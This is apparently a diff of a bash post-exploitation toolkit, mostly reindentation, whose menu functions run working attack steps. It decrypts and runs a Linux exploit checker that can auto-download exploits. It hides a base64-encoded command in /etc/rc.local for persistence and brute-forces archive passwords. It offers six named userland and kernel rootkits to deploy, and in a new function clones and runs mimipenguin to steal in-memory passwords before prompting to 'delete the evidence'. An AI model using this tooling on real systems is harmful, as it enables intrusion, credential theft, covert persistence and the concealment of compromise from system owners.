-		echo "Bad Option" && linux_exploit_check
-	fi
-elif [[ "$rk" -eq 2 ]]; then
-	if [[ "$down" =~ [Yy] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" --userspace-only -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" -b -s --userspace-only | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad Option" && linux_exploit_check
-		fi
-	elif [[ "$down" =~ [Nn] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" --checksec --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad Option" && linux_exploit_check
-		fi
-	else
-		echo "Bad option" && linux_exploit_check
-	fi
-elif [[ "$rk" -eq 1 ]]; then
-	if [[ "$down" =~ [Yy] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" -b -s --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" -b -s --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad option" && linux_exploit_check
-		fi
-	elif [[ "$down" =~ [Nn] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad option" && linux_exploit_check
-		fi
-	else
-		echo "Bad option" && linux_exploit_check
-	fi
-else
-	echo "Bad option" && linux_exploit_check
-fi
-rm "$linux_exploit_checker_bin"
-wait_and_return
+    A="$ax Linux Exploit Check ==> ${x}"
+    file="$linux_exploit_checker_bin"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    postx_kernalx_frame
+    sleep 3
+    echo -e "\nWould you like to check for: \n1 - kernel vulnabilities \n2 - userland vulnabilites \n3 - both 1 and 2 \n4 - exit to main menu \n"
+    read -r -n 1 -p "${c} ${A} ${x}" rk
+    [[ "$rk" -ge 4 ]] && wait_and_return
+    echo -e "\nDo you want a listing of other possible security related issues? Y/N \n"
+    read -r -n 1 -p "${c} ${A} ${x}" list
+    echo -e "\nIf any vulnabilities are found do you want a automatic download of the exploit script? \nExploits may be either source code or in binary format Y/N ?\n"
+    read -r -n 1 -p "${c} ${A} ${x}" down
+    export CSTK_MAIN_RUNNER=1
+    touch "$Loot/Exploit_Searcher.txt"
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$lecb" -out "$linux_exploit_checker_bin" -pass pass:"$pswd"
+    if [[ "$rk" -eq 3 ]]; then
+    	if [[ "$down" =~ [Yy] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" -b -s | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad Option" && linux_exploit_check
+    		fi
+    	elif [[ "$down" =~ [Nn] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" --checksec | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad Option" && linux_exploit_check
+    		fi
+    	else
+    		echo "Bad Option" && linux_exploit_check
+    	fi
+    elif [[ "$rk" -eq 2 ]]; then
+    	if [[ "$down" =~ [Yy] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" --userspace-only -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" -b -s --userspace-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad Option" && linux_exploit_check
+    		fi
+    	elif [[ "$down" =~ [Nn] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" --checksec --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad Option" && linux_exploit_check
+    		fi
+    	else
+    		echo "Bad option" && linux_exploit_check
+    	fi
+    elif [[ "$rk" -eq 1 ]]; then
+    	if [[ "$down" =~ [Yy] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" -b -s --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" -b -s --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad option" && linux_exploit_check
+    		fi
+    	elif [[ "$down" =~ [Nn] ]]; then
+    		if [[ "$list" =~ [Yy] ]]; then
+    			bash "$linux_exploit_checker_bin" --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		elif [[ "$list" =~ [Nn] ]]; then
+    			bash "$linux_exploit_checker_bin" --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
+    		else
+    			echo "Bad option" && linux_exploit_check
+    		fi
+    	else
+    		echo "Bad option" && linux_exploit_check
+    	fi
+    else
+    	echo "Bad option" && linux_exploit_check
+    fi
+    rm "$linux_exploit_checker_bin"
+    wait_and_return
 
 }
 
 # Class: POST EXPLOIT - Tool: Command on start up - Option 6
 startup_command() {
-clear
-postx_onstart_frame
-sleep 3
-LOOT_FILE="$Loot/embed_command_on_start.txt"
-exec > >(tee -a "$LOOT_FILE") 2>&1
-echo -e "$g \nEnter command to run at startup $x"
-read -r -p "${c} ${A} ${x}" command
-encode_cmd="echo -n '$command' | base64"
-encoded=$(eval "$encode_cmd")
-decode_cmd="echo -n '$encoded' | base64 -d"
-decoder="$""(eval ""$decode_cmd)"
-sudo echo "$decoder" >> /etc/rc.local
-echo -e "$p /nAppended encoded command to $r /etc/rc.local $x"
+    A="$ax Command On Start ==> ${x}"
+    clear
+    postx_onstart_frame
+    sleep 3
+    LOOT_FILE="$Loot/embed_command_on_start.txt"
+    exec > >(tee -a "$LOOT_FILE") 2>&1
+    echo -e "$g \nEnter command to run at startup $x"
+    read -r -p "${c} ${A} ${x}" command
+    encode_cmd="echo -n '$command' | base64"
+    encoded=$(eval "$encode_cmd")
+    decode_cmd="echo -n '$encoded' | base64 -d"
+    decoder="$""(eval ""$decode_cmd)"
+    sudo echo "$decoder" >> /etc/rc.local
+    echo -e "$p /nAppended encoded command to $r /etc/rc.local $x"
 
-wait_and_return
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: Brute force archive - Option 7
 brute_force_file() {
-clear
-postx_bruteforce_frame
-sleep 3
-echo -e "$c \nEnter the path and filename of the password file to use. $b\nExample: $r /usr/share/Seclist/passwords/rockyou.txt $x"
-read -e -r -p "${c} ${A} ${x}" dictionary
-echo -e "$y \nSpecify the full path and filename of the 7z, zip, or rar archive to bruteforce. $x"
-read -e -r -p "${c} ${A} ${x}" filename
-if ! [[ -f "$dictionary" ]]; then
-	echo -e "$r \nNo such dictionary: $dictionary$x\n"
-	exit 1
-fi
-if ! [[ -f "$filename" ]]; then
-    echo -e "$r \nNo such file found: $filename$x\n"
-    exit 1
-fi
-if command -v john &>/dev/null; then
-	if [[ $filename == *.zip ]]; then
-		zip2john "$filename" > ziphash.txt
-		john --fork=10 --format=zip --wordlist="$dictionary" ziphash.txt
-	elif [[ $filename == *.rar ]]; then
-		rar2john "$filename" > rarhash.txt
-		john --fork=10 --format=rar --wordlist="$dictionary" rarhash.txt
-	elif [[ $filename == *.7z ]]; then
-		7z2john "$filename" > 7zhash.txt
-		john --fork=10 --format=7z --wordlist="$dictionary" 7zhash.txt
-	else
-		echo -e "$r \nWrong file type or file doesn't end in .zip, .7z, or .rar. $x"
-		exit 1
-	fi
-else
-	cracked=0
-		for word in $(cat "$dictionary"); do
-			if [[ $filename == *.zip ]]; then
-    			out=$(unzip -R "$word" "$filename" 2>&1)
-    			if [[ $out == *"inflating"* ]]; then
-    				touch "$Loot/password_bruteforce_zip_results.txt"
-        			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_zip_results.txt"
-        			((cracked++))
-        			break
+    A="$ae Archive Brute Forcer ==> ${x}"
+    clear
+    postx_bruteforce_frame
+    sleep 3
+    echo -e "$c \nEnter the path and filename of the password file to use. $b\nExample: $r /usr/share/Seclist/passwords/rockyou.txt $x"
+    read -e -r -p "${c} ${A} ${x}" dictionary
+    echo -e "$y \nSpecify the full path and filename of the 7z, zip, or rar archive to bruteforce. $x"
+    read -e -r -p "${c} ${A} ${x}" filename
+    if ! [[ -f "$dictionary" ]]; then
+    	echo -e "$r \nNo such dictionary: $dictionary$x\n"
+    	exit 1
+    fi
+    if ! [[ -f "$filename" ]]; then
+        echo -e "$r \nNo such file found: $filename$x\n"
+        exit 1
+    fi
+    if command -v john &>/dev/null; then
+    	if [[ $filename == *.zip ]]; then
+    		zip2john "$filename" > ziphash.txt
+    		john --fork=10 --format=zip --wordlist="$dictionary" ziphash.txt
+    	elif [[ $filename == *.rar ]]; then
+    		rar2john "$filename" > rarhash.txt
+    		john --fork=10 --format=rar --wordlist="$dictionary" rarhash.txt
+    	elif [[ $filename == *.7z ]]; then
+    		7z2john "$filename" > 7zhash.txt
+    		john --fork=10 --format=7z --wordlist="$dictionary" 7zhash.txt
+    	else
+    		echo -e "$r \nWrong file type or file doesn't end in .zip, .7z, or .rar. $x"
+    		exit 1
+    	fi
+    else
+    	cracked=0
+    		for word in $(cat "$dictionary"); do
+    			if [[ $filename == *.zip ]]; then
+        			out=$(unzip -R "$word" "$filename" 2>&1)
+        			if [[ $out == *"inflating"* ]]; then
+        				touch "$Loot/password_bruteforce_zip_results.txt"
+            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_zip_results.txt"
+            			((cracked++))
+            			break
+        			fi
+    			elif [[ $filename == *.rar ]]; then
+        			out=$(rar x -p"$word" "$filename" 2>/dev/null)
+        			success="$?"
+        			if [[ $success -eq 0 ]]; then
+        				touch "$Loot/password_bruteforce_rar_results.txt"
+            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_rar_results.txt"
+            			((cracked++))
+            			break
+        			fi
+    			elif [[ $filename == *.7z ]]; then
+        			out=$(7z e "$filename" -p"$word" 2>/dev/null)
+        			success="$?"
+        			if [[ $success -eq 0 ]]; then
+        				touch "$Loot/password_bruteforce_7z_results.txt"
+            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_7z_results.txt"
+            			((cracked++))
+            			break
+        			fi
     			fi
-			elif [[ $filename == *.rar ]]; then
-    			out=$(rar x -p"$word" "$filename" 2>/dev/null)
-    			success="$?"
-    			if [[ $success -eq 0 ]]; then
-    				touch "$Loot/password_bruteforce_rar_results.txt"
-        			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_rar_results.txt"
-        			((cracked++))
-        			break
-    			fi
-			elif [[ $filename == *.7z ]]; then
-    			out=$(7z e "$filename" -p"$word" 2>/dev/null)
-    			success="$?"
-    			if [[ $success -eq 0 ]]; then
-    				touch "$Loot/password_bruteforce_7z_results.txt"
-        			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_7z_results.txt"
-        			((cracked++))
-        			break
-    			fi
-			fi
-		done
-		if [[ $cracked -eq 0 ]]; then
-			touch "$Loot/password_bruteforce_attempt.txt"
-			echo -e "$r\nPassword not found. Try another dictionary.$x" | tee -a "$Loot/password_bruteforce_attempt.txt"
-		fi
-fi
-wait_and_return
+    		done
+    		if [[ $cracked -eq 0 ]]; then
+    			touch "$Loot/password_bruteforce_attempt.txt"
+    			echo -e "$r\nPassword not found. Try another dictionary.$x" | tee -a "$Loot/password_bruteforce_attempt.txt"
+    		fi
+    fi
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: Files of interest - Option 8 (Wrapper Used)
 files_of_interest() {
-clear
-postx_foi_frame
-start_files=$(ls "$PWD")
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$filesofinterest_bin"
-end_files=$(ls "$PWD")
-DES_DIR="$Loot"
-new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
-for file in $new_files; do
-	if [ -f "$new_files" ]; then
-    		mv "$file" "$DES_DIR"
-    		echo -e "$p \n$file Moved to $Loot Directory $x"
-	fi
-done
+    clear
+    postx_foi_frame
+    start_files=$(ls "$PWD")
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$filesofinterest_bin"
+    end_files=$(ls "$PWD")
+    DES_DIR="$Loot"
+    new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
+    for file in $new_files; do
+    	if [ -f "$new_files" ]; then
+        		mv "$file" "$DES_DIR"
+        		echo -e "$p \n$file Moved to $Loot Directory $x"
+    	fi
+    done
 
-wait_and_return
+    wait_and_return
 }
 # Class: POST EXPLOIT - Tool: Rootkits Option 9 (WRAPPER USED)
 deploy_rootkit() {
-postx_rootkit_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
+    A="$ax Rootkit ==> ${x}"
+    postx_rootkit_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
 
-readme_userland() {
-	$open_cmd "$tools/userland_rootkit.md"
-}
-readme_kernel() {
-	$open_cmd "$tools/kernel_rootkit.md"
-}
-pick_rootkit() {
-	echo -e "$g \nChoose number option: $x"
-	echo -e "$y \n1 - azazel rootkit - userland \n2 - umbreon rootkit - userland $c \n3 - diamorphine rootkit - kernel \n4 - kovid rootkit - kernel \n5 - lkm rootkit - kernel \n6 - reptile rootkit - kernel $r \n7 - Exit \n\n $x"
-	read -r -n 1 -p "${c} ${A} ${x}" rag
-	case $rag in
-		1) "$cstk_wrapper" "$userland_rootkit_bin A" ;;
-		2) "$cstk_wrapper" "$userland_rootkit_bin U" ;;
-		3) "$cstk_wrapper" "$kernel_rootkit_bin D" ;;
-		4) "$cstk_wrapper" "$kernel_rootkit_bin K" ;;
-		5) "$cstk_wrapper" "$kernel_rootkit_bin L" ;;
-		6) "$cstk_wrapper" "$kernel_rootkit_bin R" ;;
-		7) wait_and_return ;;
-		*) exit 1 ;;
-	esac
-}
-deploy_or_read() {
-	echo -e "$g \nDo you want to: $r \n1 - $b read the userland README file $r \n2 - $b read the kernel README file $r \n3 - $p pick a rootkit to deploy on system $r \n4 - Exit $x"
-	read -r -n 1 -p "${c} ${A} ${x}" kit
-	case $kit in
-            	1) readme_userland && deploy_or_read ;;
-            	2) readme_kernel && deploy_or_read ;;
-				3) pick_rootkit ;;
-				4) exit ;;
-	esac
+    readme_userland() {
+    	$open_cmd "$tools/userland_rootkit.md"
+    }
+    readme_kernel() {
+    	$open_cmd "$tools/kernel_rootkit.md"
+    }
+    pick_rootkit() {
+    	echo -e "$g \nChoose number option: $x"
+    	echo -e "$y \n1 - azazel rootkit - userland \n2 - umbreon rootkit - userland $c \n3 - diamorphine rootkit - kernel \n4 - kovid rootkit - kernel \n5 - lkm rootkit - kernel \n6 - reptile rootkit - kernel $r \n7 - Exit \n\n $x"
+    	read -r -n 1 -p "${c} ${A} ${x}" rag
+    	case $rag in
+    		1) "$cstk_wrapper" "$userland_rootkit_bin A" ;;
+    		2) "$cstk_wrapper" "$userland_rootkit_bin U" ;;
+    		3) "$cstk_wrapper" "$kernel_rootkit_bin D" ;;
+    		4) "$cstk_wrapper" "$kernel_rootkit_bin K" ;;
+    		5) "$cstk_wrapper" "$kernel_rootkit_bin L" ;;
+    		6) "$cstk_wrapper" "$kernel_rootkit_bin R" ;;
+    		7) wait_and_return ;;
+    		*) exit 1 ;;
+    	esac
+    }
+    deploy_or_read() {
+    	echo -e "$g \nDo you want to: $r \n1 - $b read the userland README file $r \n2 - $b read the kernel README file $r \n3 - $p pick a rootkit to deploy on system $r \n4 - Exit $x"
+    	read -r -n 1 -p "${c} ${A} ${x}" kit
+    	case $kit in
+                	1) readme_userland && deploy_or_read ;;
+                	2) readme_kernel && deploy_or_read ;;
+    				3) pick_rootkit ;;
+    				4) exit ;;
+    	esac
+    }
+
+    clear
+    postx_rootkit_frame
+    echo -e "$g \nThere are two types of rootkits available $r \nuserland rootkits \nkernel rootkits $g \ni have packaged a few of each type for you."
+    echo -e "$p \nAs of 10-17-2024 i have not tested them and any information given is from there README that i recieved."
+    echo -e "$b \nMy suggestion for you is to use one of the $r kernel rootkits $b if possible and only relay on the $r userland rootkits $b if absolutely necessary."
+    echo -e "$c \nBut before you decide, first read the README files to get a better idea. $y \nThere are 2 README files one for the userland rootkits and one for the kernel rootkits. $x"
+    deploy_or_read
+    wait_and_return
 }
 
-clear
-postx_rootkit_frame
-echo -e "$g \nThere are two types of rootkits available $r \nuserland rootkits \nkernel rootkits $g \ni have packaged a few of each type for you."
-echo -e "$p \nAs of 10-17-2024 i have not tested them and any information given is from there README that i recieved."
-echo -e "$b \nMy suggestion for you is to use one of the $r kernel rootkits $b if possible and only relay on the $r userland rootkits $b if absolutely necessary."
-echo -e "$c \nBut before you decide, first read the README files to get a better idea. $y \nThere are 2 README files one for the userland rootkits and one for the kernel rootkits. $x"
-deploy_or_read
-wait_and_return
+inmem_password_stealer() {
+    A="$ax Memory Password Stealer ==> ${x}"
+    postx_inmem_frame
+    sleep 3
+    cwd="$PWD"
+    git clone https://github.com/huntergregal/mimipenguin.git
+    cd mimipenguin
+    make
+    ./mimipenguin
+    read -p "${A} Press Enter/Return when ready to delete the evidence"
+    cd "$cwd"
+    rm -rf mimipenguin
+    wait_and_return
 }
+
 
 ############################# ETC ##########################################
 
 # Class: ETC - Tool: Users and Shells - Option 1 (AWK)
 users_and_shells() {
-clear
-etc_usershells_frame
-LOOT_FILE="$Loot/users_and_shells.txt"
-exec > >(tee -a "$LOOT_FILE") 2>&1
-/usr/bin/awk -F: '
-BEGIN {
-    printf("\n\n%s\n", "/etc/passwd accounts with login shells");
-    printf("%s\n", "------------------------------------------");
-}
-{
-    if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
-}
-' /etc/passwd
-wait_and_return
+    clear
+    etc_usershells_frame
+    LOOT_FILE="$Loot/users_and_shells.txt"
+    exec > >(tee -a "$LOOT_FILE") 2>&1
+    /usr/bin/awk -F: '
+    BEGIN {
+        printf("\n\n%s\n", "/etc/passwd accounts with login shells");
+        printf("%s\n", "------------------------------------------");
+    }
+    {
+        if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
+    }
+    ' /etc/passwd
+    wait_and_return
 }
 
-# Class: ETC - Tool: Python Web server - Option 2
+    # Class: ETC - Tool: Python Web server - Option 2
 py_web_server() {
-clear
-etc_webserver_frame
-echo -e "$c \nEnter port number to use $x"
-read -r -p "${b} ${A} ${x}" num
+    A="$ae WebServer ==> ${x}"
+    clear
+    etc_webserver_frame
+    echo -e "$c \nEnter port number to use $x"
+    read -r -p "${b} ${A} ${x}" num
 
-# Validate port number
-while [[ "$num" -lt 1 || "$num" -gt 65535 ]]; do
-    echo -e "$r \nIncorrect option, must choose between 1 - 65535 $x"
-    read -r -p "${c} ${A} ${x}" num
-done
+    # Validate port number
+    while [[ "$num" -lt 1 || "$num" -gt 65535 ]]; do
+        echo -e "$r \nIncorrect option, must choose between 1 - 65535 $x"
+        read -r -p "${c} ${A} ${x}" num
+    done
 
-# Start the HTTP server in the background
-python3 -m http.server "$num" &
-server_pid=$!
+    # Start the HTTP server in the background
+    python3 -m http.server "$num" &
+    server_pid=$!
 
-echo -e "$g \nServer started on port $r $num $g with PID $r $server_pid $x. $b \nType $r S $b to stop the server $x."
-echo -e "Today's Date and Time: $DATE \nUser's Name: $USER \nScript Ran: Python3 Web Server - Start a Web Server on a given port.\n STATUS: Server started on port $num with PID $server_pid."   >> "$log/pythonserver.log"
-# Wait for user input
-while true; do
-    read -r -p "Command: " command
-    if [[ "$command" == "S" ]]; then
-        echo -e "$g \nStopping server with PID $r $server_pid $x"
-        kill "$server_pid"
-        wait "$server_pid" 2>/dev/null
-        echo -e "$p \nServer stopped. $x"
-	    echo -e "Server Stop Time: $DATE" >> "$log/pythonserver.log"
-        break
-    else
-        echo -e "$r \nInvalid command. Type S to stop the server. $x"
-    fi
-done
+    echo -e "$g \nServer started on port $r $num $g with PID $r $server_pid $x. $b \nType $r S $b to stop the server $x."
+    echo -e "Today's Date and Time: $DATE \nUser's Name: $USER \nScript Ran: Python3 Web Server - Start a Web Server on a given port.\n STATUS: Server started on port $num with PID $server_pid."   >> "$log/pythonserver.log"
+    # Wait for user input
+    while true; do
+        read -r -p "Command: " command
+        if [[ "$command" == "S" ]]; then
+            echo -e "$g \nStopping server with PID $r $server_pid $x"
+            kill "$server_pid"
+            wait "$server_pid" 2>/dev/null
+            echo -e "$p \nServer stopped. $x"
+    	    echo -e "Server Stop Time: $DATE" >> "$log/pythonserver.log"
+            break
+        else
+            echo -e "$r \nInvalid command. Type S to stop the server. $x"
+        fi
+    done
 
-wait_and_return
+    wait_and_return
 
 }
 
 # Class: ETC - Tool: File Extractor - Option 3
 extract_arch() {
-clear
-etc_extract_frame
-required_commands=(tar bunzip2 unrar gunzip unzip uncompress dpkg 7z)
-for cmd in "${required_commands[@]}"; do
-    if ! command -v "$cmd" &> /dev/null; then
-        echo -e "\n\n $r Error: $cmd is not installed. Please install it to use this script. $x"
-        exit 5
+    A="$ae File Extract ==> ${x}"
+    clear
+    etc_extract_frame
+    required_commands=(tar bunzip2 unrar gunzip unzip uncompress dpkg 7z)
+    for cmd in "${required_commands[@]}"; do
+        if ! command -v "$cmd" &> /dev/null; then
+            echo -e "\n\n $r Error: $cmd is not installed. Please install it to use this script. $x"
+            exit 5
+        fi
+    done
+    echo -e "$c Enter archive full file path $x"
+    read -e -r -p "${c} ${A} ${x}" archive
+    if [ -f "$archive" ]; then
+        case $archive in
+            *.tar.bz2) tar -x -j -f "$archive" ;;
+            *.tar.gz) tar -x -z -f "$archive" ;;
+            *.bz2) bunzip2 "$archive" ;;
+            *.rar) unrar x "$archive" ;;
+            *.gz) gunzip "$archive" ;;
+            *.tar) tar -x -f "$archive" ;;
+            *.zip) unzip "$archive" ;;
+            *.Z) uncompress "$archive" ;;
+            *.deb) dpkg -x "$archive" . ;;
+            *.7z) 7z x "$archive" ;;
+            *.tar.wz) tar -x -f "$archive" ;;
+            *) echo -e "$r '$archive' cannot be extracted by archive $x" ;;
+        esac
+    else
+        echo -e "$r '$archive' is not a valid file $x"
     fi
-done
-echo -e "$c Enter archive full file path $x"
-read -e -r -p "${c} ${A} ${x}" archive
-if [ -f "$archive" ]; then
-    case $archive in
-        *.tar.bz2) tar -x -j -f "$archive" ;;
-        *.tar.gz) tar -x -z -f "$archive" ;;
-        *.bz2) bunzip2 "$archive" ;;
-        *.rar) unrar x "$archive" ;;
-        *.gz) gunzip "$archive" ;;
-        *.tar) tar -x -f "$archive" ;;
-        *.zip) unzip "$archive" ;;
-        *.Z) uncompress "$archive" ;;
-        *.deb) dpkg -x "$archive" . ;;
-        *.7z) 7z x "$archive" ;;
-        *.tar.wz) tar -x -f "$archive" ;;
-        *) echo -e "$r '$archive' cannot be extracted by archive $x" ;;
-    esac
-else
-    echo -e "$r '$archive' is not a valid file $x"
-fi
 
-wait_and_return
+    wait_and_return
 }
 
 # Class: ETC - Tool: openssl helper - Option 4 (Wrapper Used)
 r_b_g_wrapper() {
-clear
-etc_openssl_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$openssl_helper_bin"
-wait_and_return
+    clear
+    etc_openssl_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$openssl_helper_bin"
+    wait_and_return
 }
 
 # Class: ETC - Tool: Gpg Look a like - Option 5 (Wrapper Used)
 gpg_lookalike_wrapper() {
-clear
-etc_secret_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$gpg_help_bin"
-wait_and_return
+    clear
+    etc_secret_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$gpg_help_bin"
+    wait_and_return
 }
 
 # Class: ETC - Tool: Create exe Binary - Option 6
 create_exe_binary() {
-clear
-etc_binary_frame
-LOG_FILE="$log/create_binary.log"
-exec > >(tee -a "$LOG_FILE") 2>&1
-echo -e "$p \nYour original shell script will still be available after converting to binary.$x"
-echo -e "$g \nEnter the full path and shell script name to use.$g \nExample: $r /home/john/Documents/bashscript.sh $x"
-read -e -r -p "${c} ${A} ${x}" bash_script
-echo -e "$g \nEnter the full path and the new binary script name.$g \nExample:$r /home/john/Documents/bashscript $x"
-read -e -r -p "${c} ${A} ${x}" new_script_name
+    A="$ae Create Binary ==> ${x}"
+    clear
+    etc_binary_frame
+    LOG_FILE="$log/create_binary.log"
+    exec > >(tee -a "$LOG_FILE") 2>&1
+    echo -e "$p \nYour original shell script will still be available after converting to binary.$x"
+    echo -e "$g \nEnter the full path and shell script name to use.$g \nExample: $r /home/john/Documents/bashscript.sh $x"
+    read -e -r -p "${c} ${A} ${x}" bash_script
+    echo -e "$g \nEnter the full path and the new binary script name.$g \nExample:$r /home/john/Documents/bashscript $x"
+    read -e -r -p "${c} ${A} ${x}" new_script_name
 
-if ! [ -f "$bash_script" ]; then
-    echo -e "$r \n$bash_script not found $x"
-    exit 8
-fi
-script_name="$(basename "$bash_script")"
-if ! cp "$bash_script" "/tmp/$script_name"; then
-    echo -e "$r \nError in trying to copy $bash_script $x"
-    exit 15
-fi
-#bash-obfuscate "/tmp/$script_name" -o "/tmp/$script_name.temp" || {
-#    echo -e "$r \nError obfuscating the script $x"
-#    exit 16
-#{
-#    echo '#!/bin/bash'
-#    cat "/tmp/$script_name.temp"
-#} > "/tmp/$script_name.temp2"
-shc -r -f "/tmp/$script_name" -o "$new_script_name" || { echo -e "$r \nError compiling the script to binary $x" ; exit 17 ; }
-chmod 755 "$new_script_name"
-rm -rf "/tmp/$script_name.*"
-echo -e "$g \nBinary $new_script_name is ready. $x"
-wait_and_return
+    if ! [ -f "$bash_script" ]; then
+        echo -e "$r \n$bash_script not found $x"
+        exit 8
+    fi
+    script_name="$(basename "$bash_script")"
+    if ! cp "$bash_script" "/tmp/$script_name"; then
+        echo -e "$r \nError in trying to copy $bash_script $x"
+        exit 15
+    fi
+    #bash-obfuscate "/tmp/$script_name" -o "/tmp/$script_name.temp" || {
+    #    echo -e "$r \nError obfuscating the script $x"
+    #    exit 16
+    #{
+    #    echo '#!/bin/bash'
+    #    cat "/tmp/$script_name.temp"
+    #} > "/tmp/$script_name.temp2"
+    shc -r -f "/tmp/$script_name" -o "$new_script_name" || { echo -e "$r \nError compiling the script to binary $x" ; exit 17 ; }
+    chmod 755 "$new_script_name"
+    rm -rf "/tmp/$script_name.*"
+    echo -e "$g \nBinary $new_script_name is ready. $x"
+    wait_and_return
 }
 
 # Class: ETC - Tool: Post exploit tools to go - Option 7
 past_x_2_go() {
-file="$zip2go"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-echo -e "\nThe targets computer will need zip, base64/32/16, and xxd\nAll these tools should be standard on most linux systems\nContinue? y/n"
-read -r -n 1 -p "${c} ${A} ${x}" opt
-if [[ "$opt" =~ [Nn] ]]; then
+    A="$ae Post Exploit 2 GO ==> ${x}"
+    file="$zip2go"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    echo -e "\nThe targets computer will need zip, base64/32/16, and xxd\nAll these tools should be standard on most linux systems\nContinue? y/n"
+    read -r -n 1 -p "${c} ${A} ${x}" opt
+    if [[ "$opt" =~ [Nn] ]]; then
+        wait_and_return
+    elif [[ "$opt" =~ [Yy] ]]; then 
+        openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$zip2go_enc" -out "$zip2go" -pass pass:"$pswd"
+        echo "zip file is located in the $Malware folder"
+    else
+        class_menu
+    fi
     wait_and_return
-elif [[ "$opt" =~ [Yy] ]]; then 
-    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$zip2go_enc" -out "$zip2go" -pass pass:"$pswd"
-    echo "zip file is located in the $Malware folder"
-else
-    class_menu
-fi
-wait_and_return
 }
 
 # Class: ETC - Tool: Array Encrypted Script - Option 8
 array_enc_script() {
-clear
-etc_array_frame
-# Define uppercase and lowercase arrays
-UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
-LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
-# read command to convert
-echo -ne "\e[36mEnter a command to convert:\e[0m "
-read -r -p "${c} ${A} ${x}" command
-# ask user for final script name
-echo -ne "\e[36mEnter a final script name:\e[0m "
-read -r -p "${c} ${A} ${x}" name
-# convert each letter of $command to a array index
-result=""
-for (( i=0; i<${#command}; i++ )); do
-    char="${command:$i:1}"
-    # Convert to array index
-    if [[ "$char" =~ [A-Z] ]]; then
-        index=$(printf "%d" "'$char")
-        index=$((index - 65))
-        result+="\${UF[$index]}"
